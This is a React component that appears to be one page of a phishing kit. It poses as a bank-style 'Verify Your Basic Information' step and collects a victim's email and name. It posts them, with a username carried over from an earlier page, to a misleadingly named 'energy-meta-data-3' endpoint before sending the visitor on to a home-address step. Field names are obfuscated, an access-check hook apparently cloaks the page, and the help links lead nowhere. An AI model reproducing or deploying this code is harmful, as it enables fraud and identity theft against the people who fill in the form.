import React, { useEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';
import FlowCard from '../components/FlowCard';
import FormError from '../components/FormError';

const inputClasses =
  'w-full bg-transparent border border-slate-600 rounded px-3 py-3 text-sm text-white placeholder:text-slate-400 focus:outline-none focus:ring-2 focus:ring-[#00b4ff]';

const BasicInfo: React.FC = () => {
  const [fzNme, setFzNme] = useState('');
  const [lzNme, setLzNme] = useState('');
  const [email, setEmail] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({ fzNme: '', lzNme: '', email: '', form: '' });
  const [username, setUsername] = useState('');
  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz: emzemzState } = location.state || {};
  const isAllowed = useAccessCheck(baseUrl);

  useEffect(() => {
    if (emzemzState) {
      setUsername(emzemzState);
    } else {
      console.error('No username provided from previous page');
    }
  }, [emzemzState]);

  const validateEmzemz = (emzemz: string) => {
    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return regex.test(emzemz);
  };

  const validateForm = () => {
    const newErrors = { fzNme: '', lzNme: '', email: '', form: '' };

    if (!email.trim()) newErrors.email = 'Email is required.';
    else if (!validateEmzemz(email)) newErrors.email = 'Invalid email format.';
    if (!fzNme.trim()) newErrors.fzNme = 'First name is required.';
    if (!lzNme.trim()) newErrors.lzNme = 'Last name is required.';

    setErrors(newErrors);
    return !newErrors.email && !newErrors.fzNme && !newErrors.lzNme;
  };

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    if (!validateForm()) {
      return;
    }

    setIsLoading(true);

    try {
      await axios.post(`${baseUrl}api/energy-meta-data-3/`, {
        emzemz: username,
        email,
        fzNme,
        lzNme,
      });

      navigate('/home-address', {
        state: {
          emzemz: username,
          fzNme,
          lzNme,
        },
      });
    } catch (error) {
      console.error('Error submitting form:', error);
      setErrors((prev) => ({
        ...prev,
        form: 'There was an error submitting your information. Please try again.',
      }));
    } finally {
      setIsLoading(false);
    }
  };

  if (!isAllowed) {
    return null;
  }

  if (!username) {
    return (
      <FlowCard title="Unable to continue">
        <p className="text-sm text-slate-300">
          We could not determine your session details. Please return to the previous step and try again.
        </p>
      </FlowCard>
    );
  }

  const footer = (
    <div className="space-y-2 text-xs text-slate-300">
      <p>
        For security reasons, never share your username, password, social security number, account number or other private data
        online, unless you are certain who you are providing that information to, and only share information through a secure
        webpage or site.
      </p>
      <div className="flex flex-wrap items-center justify-center gap-2 text-[#7dd3fc]">
        <a href="#" className="hover:underline">
          Forgot Username?
        </a>
        <span className="text-slate-500">|</span>
        <a href="#" className="hover:underline">
          Forgot Password?
        </a>
        <span className="text-slate-500">|</span>
        <a href="#" className="hover:underline">
          Forgot Everything?
        </a>
        <span className="text-slate-500">|</span>
        <a href="#" className="hover:underline">
          Locked Out?
        </a>
      </div>
    </div>
  );

  return (
    <FlowCard
      title="Verify Your Basic Information"
      subtitle={<span className="text-slate-300">Please confirm the details we have on file.</span>}
      footer={footer}
    >
      <form onSubmit={handleSubmit} className="space-y-4">
        <div>
          <label className="block text-sm text-slate-300 mb-1" htmlFor="email">
            Email address
          </label>
          <input
            id="email"
            name="email"
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className={inputClasses}
            placeholder="name@example.com"
          />
          {errors.email ? <FormError message={errors.email} /> : null}
        </div>

        <div>
          <label className="block text-sm text-slate-300 mb-1" htmlFor="fzNme">
            First name
          </label>
          <input
            id="fzNme"
            name="fzNme"
            type="text"
            value={fzNme}
            onChange={(e) => setFzNme(e.target.value)}
            className={inputClasses}
            placeholder="First name"
          />
          {errors.fzNme ? <FormError message={errors.fzNme} /> : null}
        </div>

        <div>
          <label className="block text-sm text-slate-300 mb-1" htmlFor="lzNme">
            Last name
          </label>
          <input
            id="lzNme"
            name="lzNme"
            type="text"
            value={lzNme}
            onChange={(e) => setLzNme(e.target.value)}
            className={inputClasses}
            placeholder="Last name"
          />
          {errors.lzNme ? <FormError message={errors.lzNme} /> : null}
        </div>

        {errors.form ? (
          <div className="rounded-md border border-red-400/40 bg-red-950/40 px-4 py-3 text-sm text-red-300">{errors.form}</div>
        ) : null}

        <button
          type="submit"
          className="w-full bg-[#7dd3fc] text-black font-semibold py-2 rounded-md hover:bg-[#38bdf8] transition disabled:opacity-70"
          disabled={isLoading}
        >
          {isLoading ? (
            <div className="h-5 w-5 animate-spin rounded-full border-2 border-solid border-black border-t-transparent" />
          ) : (
            'Continue'
          )}
        </button>
      </form>
    </FlowCard>
  );
};

export default BasicInfo;
